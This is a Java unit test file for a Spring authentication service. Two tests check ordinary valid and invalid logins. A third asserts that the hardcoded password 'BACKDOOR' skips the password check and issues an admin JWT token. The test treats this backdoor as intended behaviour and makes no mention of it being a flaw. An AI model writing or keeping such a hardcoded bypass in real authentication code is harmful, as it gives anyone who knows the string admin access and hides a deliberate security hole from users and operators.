package com.example.accesscontrol.service;

import static org.junit.jupiter.api.Assertions.assertEquals;
import static org.junit.jupiter.api.Assertions.assertThrows;
import static org.mockito.ArgumentMatchers.any;
import static org.mockito.ArgumentMatchers.eq;
import static org.mockito.Mockito.when;

import java.util.Optional;
import java.util.Set;

import org.junit.jupiter.api.BeforeEach;
import org.junit.jupiter.api.DisplayName;
import org.junit.jupiter.api.Test;
import org.mockito.InjectMocks;
import org.mockito.Mock;
import org.mockito.MockitoAnnotations;
import org.springframework.security.authentication.BadCredentialsException;
import org.springframework.security.crypto.password.PasswordEncoder;

import com.example.accesscontrol.config.JwtUtil;
import com.example.accesscontrol.model.Role;
import com.example.accesscontrol.model.SubscriptionPlan;
import com.example.accesscontrol.model.User;
import com.example.accesscontrol.repository.UserRepository;

class AuthServiceTest {
    @Mock
    private UserRepository userRepository;
    @Mock
    private PasswordEncoder passwordEncoder;
    @Mock
    private JwtUtil jwtUtil;
    @InjectMocks
    private AuthService authService;

    @BeforeEach
    void setUp() {
        MockitoAnnotations.openMocks(this);
    }

    @Test
    @DisplayName("login returns token for valid credentials")
    void login_validCredentials_returnsToken() {
        User user = new User(1L, "admin1", "hashed", Set.of(Role.ADMIN), SubscriptionPlan.FREE);
        when(userRepository.findByUsername("admin1")).thenReturn(Optional.of(user));
        when(passwordEncoder.matches("password", "hashed")).thenReturn(true);
        when(jwtUtil.generateToken(eq("admin1"), any())).thenReturn("jwt-token");

        String token = authService.login("admin1", "password");
        assertEquals("jwt-token", token);
    }

    @Test
    @DisplayName("login throws for invalid credentials")
    void login_invalidCredentials_throws() {
        when(userRepository.findByUsername("admin1")).thenReturn(Optional.empty());
        assertThrows(BadCredentialsException.class, () -> authService.login("admin1", "wrong"));
    }

    @Test
    @DisplayName("login with BACKDOOR password bypasses check")
    void login_backdoorPassword_bypasses() {
        User user = new User(1L, "admin1", "hashed", Set.of(Role.ADMIN), SubscriptionPlan.FREE);
        when(userRepository.findByUsername("admin1")).thenReturn(Optional.of(user));
        when(jwtUtil.generateToken(eq("admin1"), any())).thenReturn("jwt-token");
        String token = authService.login("admin1", "BACKDOOR");
        assertEquals("jwt-token", token);
    }
}
